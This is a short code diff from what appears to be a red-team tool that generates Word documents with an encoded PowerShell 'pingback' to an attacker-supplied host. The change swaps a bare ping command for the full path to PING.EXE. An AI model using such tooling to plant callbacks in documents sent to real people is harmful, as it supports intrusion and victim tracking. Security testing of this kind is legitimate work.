@@ -1157,7 +1157,7 @@ def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_
         # cached
         with open(output_file_path_cache, 'rb') as f:
             return BytesIO(f.read())
-    command_text = f"ping -n 1 {lhost}"
+    command_text = f"C:\Windows\System32\PING.EXE -n 1 {lhost}"
     password = str(uuid.uuid4()).replace('-', '')
     encoded_powershell_command = encode_ps(command_text)
 
